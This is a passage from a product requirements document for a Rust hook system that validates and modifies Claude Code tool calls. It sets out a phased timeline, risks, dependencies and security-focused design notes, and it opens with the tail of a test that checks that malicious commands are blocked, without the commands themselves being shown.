    ];
    
    for cmd in malicious_commands {
        let result = validate_bash_command(cmd);
        assert!(result.is_blocked(), "Should block: {}", cmd);
    }
}
```

## Timeline Estimate

### Phase 1: Core Hook Processing (Weeks 1-2)
**Week 1**: JSON message parsing and CLI command structure
- Implement `PreToolHookInput` and `PostToolHookInput` parsing
- Create CLI commands for all hook types
- Set up async processing pipeline foundation
- Basic stdin/stdout processing

**Week 2**: Security validation and path enforcement
- Implement `SecurityValidator` with path traversal protection
- Create `WorkspacePathEnforcer` for workspace boundary validation
- Add dangerous command detection patterns
- Unit tests for security validation

**Deliverables**:
- Working CLI commands for all hook types
- JSON parsing with error handling
- Basic security validation framework
- <20ms execution time achieved

### Phase 2: Tool Parameter Modification (Weeks 3-4)
**Week 3**: Parameter analysis and modification engine
- Implement `ParameterAnalyzer` for tool parameter inspection
- Create tool-specific path extraction logic
- Build parameter modification framework
- Add workspace path rewriting capabilities

**Week 4**: Task spawning and agent coordination
- Implement `SpawnDecisionEngine` for agent spawn recommendations
- Create workspace assignment and allocation system
- Add agent capacity tracking
- Build parameter modification for task delegation

**Deliverables**:
- Tool parameter modification system
- Task spawning recommendations
- Workspace assignment automation
- Integration with agent coordination

### Phase 3: Performance Optimization (Weeks 5-6)
**Week 5**: SIMD optimization and memory management
- Integrate SIMD-JSON for high-performance parsing
- Implement object pooling for frequent allocations
- Add zero-copy optimizations where possible
- Create async processing pipeline

**Week 6**: Benchmarking and performance tuning
- Comprehensive performance benchmarking suite
- Memory usage profiling and optimization
- CPU usage optimization with profiling
- Performance regression testing framework

**Deliverables**:
- <10ms execution time achieved (95th percentile)
- <2MB memory usage per execution
- SIMD-optimized JSON processing
- Performance monitoring and metrics

### Phase 4: Testing and Integration (Weeks 7-8)
**Week 7**: Comprehensive testing suite
- Unit tests for all components (>95% coverage)
- Integration tests with Claude Code simulation
- Security testing with attack vectors
- Cross-platform compatibility testing

**Week 8**: Documentation and deployment preparation
- API documentation and usage examples
- Migration guide from Python hooks
- Performance benchmarking reports
- Production deployment validation

**Deliverables**:
- Complete test suite with high coverage
- Security validation against known attacks
- Cross-platform compatibility verified
- Production-ready hook integration system

## Risk Assessment & Mitigation

### Technical Risks

**Risk**: Performance targets not met due to JSON parsing overhead
**Probability**: Medium **Impact**: High
**Mitigation**: Early SIMD-JSON integration, comprehensive benchmarking, fallback to zero-copy approaches

**Risk**: Tool parameter modification breaks compatibility with Claude Code
**Probability**: Low **Impact**: High
**Mitigation**: Extensive integration testing, parameter modification validation, rollback mechanisms

**Risk**: Task spawning creates resource contention and deadlocks
**Probability**: Medium **Impact**: Medium
**Mitigation**: Agent capacity limits, resource allocation tracking, deadlock detection algorithms

### Integration Risks

**Risk**: Claude Code API changes break hook compatibility
**Probability**: Low **Impact**: High
**Mitigation**: Version detection, API compatibility layers, graceful degradation

**Risk**: Workspace isolation failures cause security vulnerabilities
**Probability**: Low **Impact**: High
**Mitigation**: Defense-in-depth security, extensive path validation testing, security audits

### Performance Risks

**Risk**: Memory usage exceeds budget under high concurrency
**Probability**: Medium **Impact**: Medium
**Mitigation**: Object pooling, memory profiling, concurrency limits, back-pressure mechanisms

**Risk**: SIMD optimizations don't work on all target platforms
**Probability**: Low **Impact**: Medium
**Mitigation**: Runtime SIMD detection, fallback implementations, platform-specific testing

## Dependencies for Other PRDs

This Hook Integration PRD enables and integrates with:

### Direct Integration
- **PRD-02: Security Validation** (provides hook-level security enforcement)
- **PRD-03: Session Management** (coordinates agent spawning and workspace assignment)
- **PRD-04: Git Worktree Management** (creates isolated workspaces for spawned agents)
- **PRD-05: TTS Integration** (processes notification hooks for audio feedback)

### Enhanced by Hook Integration
- **PRD-07: CLI Command Framework** (hook commands integrate with main CLI)
- **PRD-08: Performance Monitoring** (hook performance metrics and optimization)
- **PRD-09: Agent Coordination** (task spawning and workspace management)

## Implementation Notes

### 1. Development Priority
This PRD has **P1 Priority** as it provides the primary interface between Claude Code and MAOS. While PRD-01 (Foundation) is required, hook integration is essential for user-facing functionality.

### 2. Migration Strategy
During development, maintain compatibility with Python hooks by:
- Supporting identical CLI command interfaces
- Matching JSON message formats exactly
- Providing equivalent exit codes and error messages
- Allowing gradual rollout with fallback mechanisms

### 3. Performance Monitoring Integration
All hook operations include built-in performance instrumentation:
- Execution time tracking with percentile calculations
- Memory usage monitoring and leak detection
- CPU usage profiling for optimization opportunities
- Throughput metrics for capacity planning

### 4. Security-First Design
Security considerations are integrated throughout:
- Input validation at every boundary
- Path traversal protection with multiple validation layers
- Command injection prevention with allowlist approaches
- Workspace isolation with fail-safe defaults

## Summary

The MAOS Hook Integration delivers blazing-fast (<10ms) Claude Code integration that transforms MAOS from a background orchestration system into an intelligent, proactive development assistant. By processing pre-tool-use and post-tool-use events with zero-copy optimizations and SIMD-accelerated JSON parsing, this system provides security validation, intelligent task spawning, and seamless workspace management without interrupting the natural development flow.

**Expected Outcome**: A production-ready hook system that makes Claude Code work 10x smarter by automatically spawning specialized agents, enforcing workspace boundaries, and providing security protection—all while being completely invisible to the user experience. The Rust implementation will deliver performance improvements of 5-20x over the Python hooks while enabling advanced coordination features impossible with the previous architecture.

This hook integration is the secret sauce that makes MAOS feel like magic—instant, intelligent, and always working perfectly behind the scenes. 🚀💯⚡